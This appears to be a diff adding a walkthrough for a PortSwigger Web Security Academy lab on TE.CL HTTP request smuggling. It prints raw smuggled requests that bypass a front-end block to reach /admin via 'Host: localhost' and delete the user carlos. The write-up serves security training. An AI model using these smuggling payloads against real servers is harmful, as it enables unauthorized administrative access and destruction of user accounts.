@@ -1,0 +1,116 @@
+// Lab: Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability
+
+
+This lab involves a front-end and back-end server, and the back-end server doesn't support chunked encoding. There's an admin panel at /admin, but the front-end server blocks access to it.
+
+To solve the lab, smuggle a request to the back-end server that accesses the admin panel and deletes the user carlos.
+
+
+
+// Solution
+
+1. First Intercept the request and send to Repeater twice so the 2 request will look like:
+
+// Attacker request
+
+POST / HTTP/1.1
+
+Host: 0a99004903689f56873f51fc00fe00e5.web-security-academy.net
+
+Content-Type: application/x-www-form-urlencoded
+
+Content-Length: 4
+
+Transfer-Encoding: chunked
+
+
+
+28
+
+GET /admin HTTP/1.1
+
+Content-Length: 8
+
+
+
+0
+
+
+// Normal request
+
+POST / HTTP/1.1
+
+Host: 0a99004903689f56873f51fc00fe00e5.web-security-academy.net
+
+Content-Type: application/x-www-form-urlencoded
+
+Content-Length: 7
+
+
+
+foo=bar
+
+
+
+2. So after sending the request we will see the unathorized access so it required localhost user.
+
+
+
+3. So edit the Attacker request by adding host: localhost just like following request:
+
+POST / HTTP/1.1
+
+Host: 0a99004903689f56873f51fc00fe00e5.web-security-academy.net
+
+Content-Type: application/x-www-form-urlencoded
+
+Content-Length: 4
+
+Transfer-Encoding: chunked
+
+
+
+39
+
+GET /admin HTTP/1.1
+
+Host: localhost
+
+Content-Length: 8
+
+
+
+0
+
+
+
+4. So Now we can access the admin panel now it's time to delete the carlos so inject the following request
+   to delete the user.
+
+POST / HTTP/1.1
+
+Host: 0a99004903689f56873f51fc00fe00e5.web-security-academy.net
+
+Content-Type: application/x-www-form-urlencoded
+
+Content-Length: 4
+
+Transfer-Encoding: chunked
+
+
+
+50
+
+GET /admin/delete?username=carlos HTTP/1.1
+
+Host: localhost
+
+Content-Length: 8
+
+
+
+0
+
+
+
+5. Now the lab will be solved.
